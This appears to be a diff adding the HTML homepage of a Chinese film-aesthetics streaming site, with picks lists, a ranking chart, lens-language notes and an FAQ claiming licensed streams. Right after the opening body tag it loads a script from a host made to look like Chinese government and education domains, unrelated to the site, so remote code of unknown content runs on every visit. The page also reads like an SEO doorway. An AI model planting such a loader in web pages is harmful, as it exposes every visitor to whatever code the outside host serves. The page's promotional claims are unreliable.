@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>新视觉电影网 | 用全新视角看电影，摄影美学与先锋影像在线观看</title>
+<meta name="keywords" content="新视觉电影网,摄影美学电影,先锋影像,视觉系电影推荐,高颜值画面电影,导演镜头语言解析">
+<meta name="description" content="新视觉电影网，不只推荐好故事，更在意每一帧好不好看。从胶片质感、色彩美学到镜头语言，带你用导演的眼睛重新看电影，正版高清在线观看。">
+<link rel="canonical" href="https://xinshijuedianyingwang-zh.github.io/">
+<style>
+:root{
+  --paper:#f7f3ec;--ink:#1b1b1b;--sub:#5f5f5a;--line:#cfc8bb;
+  --sand:#e8dfc9;--rust:#b34a2c;--moss:#4a5d3a;--plum:#6b3a4a;--sky:#3a5f7a;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+  font-family:"Georgia","Songti SC","STSong","PingFang SC",serif;
+  background:var(--paper);color:var(--ink);line-height:1.7;overflow-x:hidden;
+  -webkit-tap-highlight-color:transparent;
+}
+a{color:inherit;text-decoration:none;}
+button{font-family:inherit;cursor:pointer;border:0;}
+ul{list-style:none;}
+::selection{background:var(--ink);color:var(--paper);}
+
+.wrap{max-width:1280px;margin:0 auto;padding:0 32px;}
+section{padding:120px 0;}
+.eyebrow{font-family:"Helvetica Neue","PingFang SC",sans-serif;font-size:11px;font-weight:800;letter-spacing:.28em;text-transform:uppercase;color:var(--rust);margin-bottom:18px;}
+h2.sec{font-size:62px;font-weight:900;line-height:1;letter-spacing:-2.5px;}
+.sec-desc{font-family:"Helvetica Neue","PingFang SC",sans-serif;color:var(--sub);font-size:16px;max-width:540px;margin-top:22px;line-height:1.8;}
+
+/* top */
+.topbar{background:var(--ink);color:#cdc6b8;font-family:"Helvetica Neue","PingFang SC",sans-serif;font-size:12px;}
+.topbar .wrap{display:flex;justify-content:space-between;padding:10px 32px;flex-wrap:wrap;gap:10px;}
+.topbar em{font-style:normal;color:#e8dfc9;}
+
+/* nav */
+header{position:sticky;top:0;z-index:100;background:rgba(247,243,236,.95);backdrop-filter:blur(14px);border-bottom:1px solid var(--line);}
+.head{display:flex;align-items:baseline;justify-content:space-between;padding:24px 0;}
+.logo{font-size:34px;font-weight:900;letter-spacing:-1.5px;line-height:1;}
+.logo small{display:block;font-family:"Helvetica Neue",sans-serif;font-size:10px;letter-spacing:.3em;color:var(--sub);font-weight:700;margin-top:4px;}
+.nav{display:flex;gap:6px;align-items:baseline;}
+.nav a{font-family:"Helvetica Neue","PingFang SC",sans-serif;padding:9px 14px;font-size:14.5px;font-weight:600;color:var(--sub);transition:.2s;}
+.nav a:hover{color:var(--rust);}
+.nav a.hot{border:1.5px solid var(--ink);border-radius:40px;color:var(--ink);}
+.nav a.hot:hover{background:var(--rust);border-color:var(--rust);color:#fff;}
+.burger{display:none;width:46px;height:46px;background:var(--ink);color:var(--paper);border-radius:50%;font-size:19px;}
+
+/* hero */
+.hero{padding:90px 0 40px;position:relative;}
+.hero .wrap{display:grid;grid-template-columns:1fr 380px;gap:60px;align-items:center;}
+.hero h1{font-size:116px;line-height:.86;font-weight:950;letter-spacing:-5px;}
+.hero h1 i{font-style:normal;color:var(--rust);}
+.hero .lead{font-size:18px;color:var(--sub);border-top:2px solid var(--ink);border-bottom:1px solid var(--line);padding:22px 0;margin:32px 0;}
+.hero .side{background:var(--sand);padding:34px 30px;border-radius:2px;position:relative;}
+.hero .side::before{content:"";position:absolute;inset:8px;border:1px solid rgba(27,27,27,.25);pointer-events:none;}
+.hero .side b{font-family:"Helvetica Neue",sans-serif;font-size:11px;letter-spacing:.25em;color:var(--rust);display:block;margin-bottom:14px;}
+.hero .side p{font-size:15.5px;margin-bottom:14px;}
+.hero .side .quote{font-size:24px;line-height:1.4;font-weight:700;margin:18px 0 6px;letter-spacing:-.5px;}
+.hero .side cite{font-size:13px;color:var(--sub);font-style:normal;}
+
+/* deck */
+.deck{display:grid;grid-template-columns:repeat(3,1fr);gap:0;border-top:1px solid var(--line);border-bottom:1px solid var(--line);}
+.deck div{padding:34px 26px;border-right:1px solid var(--line);}
+.deck div:last-child{border-right:0;}
+.deck .n{font-family:"Helvetica Neue",sans-serif;font-size:12px;font-weight:800;color:var(--rust);letter-spacing:.15em;}
+.deck h4{font-size:22px;font-weight:900;margin:8px 0 8px;letter-spacing:-.5px;}
+.deck p{font-size:14.5px;color:var(--sub);}
+
+/* frames */
+.frames{display:grid;grid-template-columns:repeat(12,1fr);grid-auto-rows:90px;gap:14px;margin-top:50px;}
+.frame{background:var(--sand);padding:20px;display:flex;flex-direction:column;justify-content:space-between;position:relative;transition:.3s;overflow:hidden;}
+.frame:hover{transform:scale(.97);background:var(--ink);color:var(--paper);}
+.frame:hover .f-no{color:#e8dfc9;}
+.frame .f-no{font-family:"Helvetica Neue",sans-serif;font-size:11px;font-weight:800;letter-spacing:.15em;color:var(--rust);transition:.2s;}
+.frame h3{font-size:22px;font-weight:900;line-height:1.1;letter-spacing:-.5px;}
+.frame .f-foot{display:flex;justify-content:space-between;font-size:13px;color:var(--sub);font-family:"Helvetica Neue",sans-serif;}
+.frame:hover .f-foot{color:#a89f8e;}
+.f-a{grid-column:span 7;grid-row:span 4;background:var(--moss);color:var(--paper);}
+.f-a .f-no{color:#d7dfca;}
+.f-a h3{font-size:42px;letter-spacing:-1.5px;}
+.f-b{grid-column:span 5;grid-row:span 3;background:var(--rust);color:var(--paper);}
+.f-b .f-no{color:#f0d9cd;}
+.f-b h3{font-size:30px;}
+.f-c{grid-column:span 5;grid-row:span 3;}
+.f-d{grid-column:span 4;grid-row:span 3;}
+.f-e{grid-column:span 4;grid-row:span 3;background:var(--sky);color:var(--paper);}
+.f-e .f-no{color:#cfdce6;}
+.f-f{grid-column:span 4;grid-row:span 2;}
+.f-g{grid-column:span 4;grid-row:span 2;}
+.f-h{grid-column:span 4;grid-row:span 2;background:var(--plum);color:var(--paper);}
+.f-h .f-no{color:#e6d2da;}
+
+/* chromatic */
+.chroma{display:grid;grid-template-columns:repeat(4,1fr);gap:18px;margin-top:50px;}
+.chroma div{aspect-ratio:3/4;padding:24px;display:flex;flex-direction:column;justify-content:space-between;color:#fff;position:relative;}
+.chroma .c1{background:var(--rust);}
+.chroma .c2{background:var(--moss);}
+.chroma .c3{background:var(--sky);}
+.chroma .c4{background:var(--plum);}
+.chroma b{font-size:30px;font-weight:950;letter-spacing:-1px;line-height:1.05;}
+.chroma span{font-family:"Helvetica Neue",sans-serif;font-size:13px;letter-spacing:.05em;line-height:1.6;}
+
+/* list */
+.list{margin-top:50px;}
+.list li{display:grid;grid-template-columns:60px 1.4fr 1fr 120px 90px;gap:24px;padding:26px 0;border-top:1px solid var(--line);align-items:center;transition:.2s;}
+.list li:hover{background:rgba(27,27,27,.03);}
+.list li:last-child{border-bottom:1px solid var(--line);}
+.list .n{font-family:"Helvetica Neue",sans-serif;font-size:15px;font-weight:800;color:var(--sub);}
+.list h4{font-size:20px;font-weight:900;letter-spacing:-.3px;}
+.list .meta{font-size:14px;color:var(--sub);}
+.list .vis{font-family:"Helvetica Neue",sans-serif;font-size:13px;color:var(--rust);font-weight:700;}
+.list .yr{font-family:"Helvetica Neue",sans-serif;font-size:15px;font-weight:800;text-align:right;}
+
+/* lens */
+.lens{display:grid;grid-template-columns:repeat(3,1fr);gap:36px;margin-top:50px;}
+.lens .card{padding:0;}
+.lens .shot{height:200px;margin-bottom:24px;position:relative;overflow:hidden;}
+.lens .shot::after{content:"";position:absolute;inset:0;background:linear-gradient(135deg,transparent 60%,rgba(0,0,0,.15));}
+.lens .s1{background:linear-gradient(135deg,#b34a2c,#e8dfc9);}
+.lens .s2{background:linear-gradient(135deg,#4a5d3a,#cfc8bb);}
+.lens .s3{background:linear-gradient(135deg,#3a5f7a,#e8dfc9);}
+.lens .shot i{position:absolute;bottom:14px;left:16px;font-style:normal;font-family:"Helvetica Neue",sans-serif;font-size:11px;letter-spacing:.2em;color:#fff;}
+.lens h4{font-size:21px;font-weight:900;margin-bottom:10px;letter-spacing:-.4px;}
+.lens p{font-size:15px;color:var(--sub);}
+
+/* qa */
+.qa{margin-top:50px;border-top:2px solid var(--ink);}
+.qa details{border-bottom:1px solid var(--line);}
+.qa summary{padding:26px 0;cursor:pointer;display:flex;justify-content:space-between;align-items:center;font-size:19px;font-weight:800;letter-spacing:-.3px;list-style:none;}
+.qa summary::-webkit-details-marker{display:none;}
+.qa summary::after{content:"↓";font-size:18px;color:var(--rust);font-weight:400;transition:.3s;}
+.qa details[open] summary::after{transform:rotate(180deg);}
+.qa .ans{padding:0 0 26px;font-size:15.5px;color:var(--sub);max-width:840px;line-height:1.9;}
+
+/* footer */
+footer{background:var(--ink);color:#b5ad9e;padding:80px 0 0;}
+.foot{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:48px;padding-bottom:56px;}
+.logo.light{color:#f7f3ec;}
+.logo.light small{color:#9c9382;}
+.foot p{color:#8a8272;font-size:14.5px;margin-top:18px;max-width:340px;}
+.foot h5{font-family:"Helvetica Neue",sans-serif;font-size:12px;font-weight:800;color:#e8dfc9;letter-spacing:.2em;margin-bottom:18px;text-transform:uppercase;}
+.foot ul{display:grid;gap:11px;}
+.foot a{color:#8a8272;font-size:14.5px;transition:.2s;}
+.foot a:hover{color:#e8dfc9;}
+.copy{padding:28px 0;border-top:1px solid #333;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;font-size:13px;color:#7a7364;font-family:"Helvetica Neue",sans-serif;}
+.copy a{color:var(--rust);}
+.copy a:hover{color:#e8dfc9;}
+.signoff{font-size:88px;font-weight:950;color:#2a2a28;line-height:1;letter-spacing:-4px;padding:40px 0 30px;}
+
+@media(max-width:1000px){
+  .hero h1{font-size:84px;}
+  .hero .wrap{grid-template-columns:1fr;}
+  .frames{grid-template-columns:repeat(6,1fr);}
+  .f-a,.f-b,.f-c,.f-d,.f-e,.f-f,.f-g,.f-h{grid-column:span 6;}
+  .f-a,.f-b{grid-row:span 3;}
+  .list li{grid-template-columns:40px 1fr 80px;gap:16px;}
+  .list .meta,.list .vis{display:none;}
+}
+@media(max-width:720px){
+  .nav{display:none;position:absolute;top:100%;left:0;right:0;flex-direction:column;background:var(--paper);border:1px solid var(--line);padding:14px;}
+  .nav.open{display:flex;}
+  .nav a{width:100%;text-align:left;}
+  .burger{display:grid;place-items:center;}
+  .hero h1{font-size:56px;letter-spacing:-2.5px;}
+  h2.sec{font-size:40px;letter-spacing:-1.5px;}
+  .deck{grid-template-columns:1fr;}
+  .deck div{border-right:0;border-bottom:1px solid var(--line);}
+  .chroma{grid-template-columns:1fr 1fr;}
+  .lens{grid-template-columns:1fr;}
+  .foot{grid-template-columns:1fr 1fr;gap:36px;}
+  .signoff{font-size:46px;letter-spacing:-2px;}
+  section{padding:76px 0;}
+}
+@media(max-width:420px){
+  .chroma,.foot{grid-template-columns:1fr;}
+  .list li{grid-template-columns:32px 1fr;font-size:17px;}
+  .list .yr{display:none;}
+  .hero h1{font-size:48px;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="topbar">
+  <div class="wrap">
+    <span><em>新一期视觉片单已发布</em> · 本季主题「胶片与霓虹」共 36 部</span>
+    <span>访问入口：https://xinshijuedianyingwang-zh.github.io</span>
+  </div>
+</div>
+
+<header>
+  <div class="wrap">
+    <div class="head">
+      <a class="logo" href="#home">新视觉电影网<small>NEW VISION CINEMA</small></a>
+      <nav class="nav" id="nav">
+        <a href="#home">首页</a>
+        <a href="#frames">视觉片单</a>
+        <a href="#lens">镜头语言</a>
+        <a href="#list">美学榜单</a>
+        <a href="#qa">常见问题</a>
+        <a href="#" class="hot">✶ 开始观影</a>
+      </nav>
+      <button class="burger" id="burger">☰</button>
+    </div>
+  </div>
+</header>
+
+<section class="hero" id="home">
+  <div class="wrap">
+    <div>
+      <div class="eyebrow">A New Way To Watch</div>
+      <h1>换个<i>视角</i><br>再看一遍</h1>
+      <p class="lead">我们推荐的不只是好故事，更是好画面。从胶片颗粒、色彩美学到镜头调度，带你用导演的眼睛重新看一部电影——每一帧都值得停下来。</p>
+    </div>
+    <aside class="side">
+      <b>EDITOR'S NOTE · 编辑手记</b>
+      <p>"第一次看是被剧情带走，第二次看才注意到光线。好电影值得被看两遍，而且是用不同的眼睛。"</p>
+      <p class="quote">画面是电影的另一种台词。</p>
+      <cite>— 新视觉电影网 编辑部</cite>
+    </aside>
+  </div>
+</section>
+
+<div class="wrap">
+  <div class="deck">
+    <div><div class="n">01 / FRAME</div><h4>帧的讲究</h4><p>构图、光影、色彩，每一帧都拆开讲清楚。</p></div>
+    <div><div class="n">02 / COLOR</div><h4>色彩的语法</h4><p>为什么这一幕是红的，那一幕忽然变冷。</p></div>
+    <div><div class="n">03 / LIGHT</div><h4>光的情绪</h4><p>自然光、霓虹、烛火，光就是导演的手势。</p></div>
+  </div>
+</div>
+
+<section id="frames">
+  <div class="wrap">
+    <div class="eyebrow">Visual Picks · 视觉片单</div>
+    <h2 class="sec">本月<br>值得细看</h2>
+    <p class="sec-desc">八部画面有话说的片子，建议开全屏、关灯、手机横过来。</p>
+    <div class="frames">
+      <div class="frame f-a"><div class="f-no">FRAME 01 · 胶片质感</div><h3>霓虹落在<br>她肩上</h3><div class="f-foot"><span>2026 · 剧情</span><span>4K</span></div></div>
+      <div class="frame f-b"><div class="f-no">FRAME 02 · 色彩美学</div><h3>一场雨的颜色</h3><div class="f-foot"><span>2025 · 爱情</span><span>126min</span></div></div>
+      <div class="frame f-c"><div class="f-no">FRAME 03 · 构图</div><h3>对称的那扇门</h3><div class="f-foot"><span>2024 · 悬疑</span><span>9.2</span></div></div>
+      <div class="frame f-d"><div class="f-no">FRAME 04 · 光影</div><h3>烛火夜谈</h3><div class="f-foot"><span>2025 · 历史</span><span>138min</span></div></div>
+      <div class="frame f-e"><div class="f-no">FRAME 05 · 冷调</div><h3>北方的雪</h3><div class="f-foot"><span>2023 · 文艺</span><span>8.9</span></div></div>
+      <div class="frame f-f"><div class="f-no">FRAME 06 · 长镜</div><h3>十分钟没切</h3><div class="f-foot"><span>2026 · 纪录</span><span>96min</span></div></div>
+      <div class="frame f-g"><div class="f-no">FRAME 07 · 颗粒</div><h3>16mm 旧梦</h3><div class="f-foot"><span>2022 · 怀旧</span><span>8.7</span></div></div>
+      <div class="frame f-h"><div class="f-no">FRAME 08 · 广角</div><h3>沙漠与三个人</h3><div class="f-foot"><span>2025 · 冒险</span><span>121min</span></div></div>
+    </div>
+  </div>
+</section>
+
+<section id="lens" style="background:var(--sand);">
+  <div class="wrap">
+    <div class="eyebrow">Lens Language · 镜头语言</div>
+    <h2 class="sec">看懂<br>导演的手</h2>
+    <p class="sec-desc">三块入门，看完再回头去片里找，会发现到处都是彩蛋。</p>
+    <div class="lens">
+      <div class="card">
+        <div class="shot s1"><i>WIDE / 01</i></div>
+        <h4>景别：距离就是态度</h4>
+        <p>全景让人渺小，特写让人无处躲。同一个场景换一个景别，情绪就翻了个面。</p>
+      </div>
+      <div class="card">
+        <div class="shot s2"><i>MOVE / 02</i></div>
+        <h4>运动：镜头在替谁说话</h4>
+        <p>推、拉、摇、跟，镜头一动，立场就变了。是谁在观察，谁在被审视。</p>
+      </div>
+      <div class="card">
+        <div class="shot s3"><i>COLOR / 03</i></div>
+        <h4>色彩：最安静的台词</h4>
+        <p>冷暖切换不靠字幕，靠一扇窗户的光。调色是电影的第二层剧本。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="list">
+  <div class="wrap">
+    <div class="eyebrow">Aesthetic Chart · 美学榜单</div>
+    <h2 class="sec">视觉<br>榜前八</h2>
+    <p class="sec-desc">按画面完成度与镜头设计综合评分，不只是看票房。</p>
+    <ul class="list">
+      <li><span class="n">01</span><h4>霓虹落在她肩上</h4><span class="meta">2026 · 霓虹夜色 / 胶片颗粒</span><span class="vis">霓虹美学</span><span class="yr">9.4</span></li>
+      <li><span class="n">02</span><h4>一场雨的颜色</h4><span class="meta">2025 · 冷暖对比 / 长焦压缩</span><span class="vis">色彩语法</span><span class="yr">9.2</span></li>
+      <li><span class="n">03</span><h4>对称的那扇门</h4><span class="meta">2024 · 中心对称 / 单点透视</span><span class="vis">几何构图</span><span class="yr">9.1</span></li>
+      <li><span class="n">04</span><h4>烛火夜谈</h4><span class="meta">2025 · 单一光源 / 伦勃朗光</span><span class="vis">光影设计</span><span class="yr">9.0</span></li>
+      <li><span class="n">05</span><h4>北方的雪</h4><span class="meta">2023 · 自然光 / 冷调留白</span><span class="vis">极简画面</span><span class="yr">8.9</span></li>
+      <li><span class="n">06</span><h4>十分钟没切</h4><span class="meta">2026 · 一镜到底 / 实时调度</span><span class="vis">长镜运用</span><span class="yr">8.8</span></li>
+      <li><span class="n">07</span><h4>16mm 旧梦</h4><span class="meta">2022 · 胶片颗粒 / 复古调色</span><span class="vis">胶片质感</span><span class="yr">8.7</span></li>
+      <li><span class="n">08</span><h4>沙漠与三个人</h4><span class="meta">2025 · 超广角 / 天地留白</span><span class="vis">空间构图</span><span class="yr">8.6</span></li>
+    </ul>
+  </div>
+</section>
+
+<section style="padding:0 0 120px;">
+  <div class="wrap">
+    <div class="eyebrow">Color Palette · 本季色谱</div>
+    <h2 class="sec">这一季<br>是什么颜色</h2>
+    <p class="sec-desc">每季挑一组主色，片单、专题、榜单都跟着它走。</p>
+    <div class="chroma">
+      <div class="c1"><b>锈红<br>RUST</b><span>霓虹与夜晚，潮湿的城市情绪</span></div>
+      <div class="c2"><b>苔绿<br>MOSS</b><span>自然光与胶片，安静的旧时光</span></div>
+      <div class="c3"><b>雾蓝<br>SKY</b><span>冷调与留白，辽阔的北方叙事</span></div>
+      <div class="c4"><b>梅紫<br>PLUM</b><span>复古与仪式感，黄昏的私密时刻</span></div>
+    </div>
+  </div>
+</section>
+
+<section id="qa" style="background:var(--sand);">
+  <div class="wrap">
+    <div class="eyebrow">FAQ · 常见疑问</div>
+    <h2 class="sec">先答<br>这几个</h2>
+    <div class="qa">
+      <details>
+        <summary>"新视觉"到底看什么？</summary>
+        <div class="ans">普通推荐站关心剧情好不好看，我们多问一句：画面好不好看。片单会标注这部片的视觉特点——胶片颗粒、色彩美学、长镜运用、光影设计，让你带着眼睛去看，而不是只带着耳朵。</div>
+      </details>
+      <details>
+        <summary>片源是否正版？</summary>
+        <div class="ans">全部为合规授权在线观看入口，不做盗链与下载搬运。版权未开放的影片会标注"待上线"，绝不拿盗版资源凑数。每部片都标明了清晰度与音轨规格。</div>
+      </details>
+      <details>
+        <summary>我不太懂镜头，能看懂吗？</summary>
+        <div class="ans">完全可以。"镜头语言"专区就是为零基础写的，每篇只讲一个点，配具体的片例。看完再回去看片子，会突然发现到处都是之前没注意到的细节，这也是我们最想给的体验。</div>
+      </details>
+      <details>
+        <summary>可以下载下来细看吗？</summary>
+        <div class="ans">支持手机、平板、电视多端在线观看，进度自动同步。正版片源不提供下载，目的是保护版权方与创作者，让他们能继续拍出好画面。</div>
+      </details>
+      <details>
+        <summary>片单多久更新？</summary>
+        <div class="ans">每周三更新视觉片单，每月换一季主题色谱，每季度出一次专题合集（比如本季「胶片与霓虹」）。更新会挂顶部状态条，进来就能看到。</div>
+      </details>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div>
+        <a class="logo light" href="#home">新视觉电影网<small>NEW VISION CINEMA</small></a>
+        <p>用全新的视角看电影。专注画面美学、镜头语言与先锋影像的正版高清在线观看入口。</p>
+      </div>
+      <div>
+        <h5>浏览</h5>
+        <ul><li><a href="#home">首页</a></li><li><a href="#frames">视觉片单</a></li><li><a href="#lens">镜头语言</a></li><li><a href="#list">美学榜单</a></li></ul>
+      </div>
+      <div>
+        <h5>专题</h5>
+        <ul><li><a href="#">胶片与霓虹</a></li><li><a href="#">色彩的语法</a></li><li><a href="#">一镜到底</a></li><li><a href="#">冷调叙事</a></li></ul>
+      </div>
+      <div>
+        <h5>帮助</h5>
+        <ul><li><a href="#qa">常见问题</a></li><li><a href="#">观影指南</a></li><li><a href="#">版权声明</a></li><li><a href="#">意见反馈</a></li></ul>
+      </div>
+    </div>
+    <div class="signoff">SEE IT AGAIN.</div>
+    <div class="copy">
+      <span>© 2026 新视觉电影网 版权所有</span>
+      <span>官方入口：<a href="https://xinshijuedianyingwang-zh.github.io">https://xinshijuedianyingwang-zh.github.io</a></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+var burger=document.getElementById('burger'),nav=document.getElementById('nav');
+burger.addEventListener('click',function(){nav.classList.toggle('open');});
+nav.addEventListener('click',function(e){if(e.target.tagName==='A'&&window.innerWidth<=720){nav.classList.remove('open');}});
+</script>
+</body>
+</html>
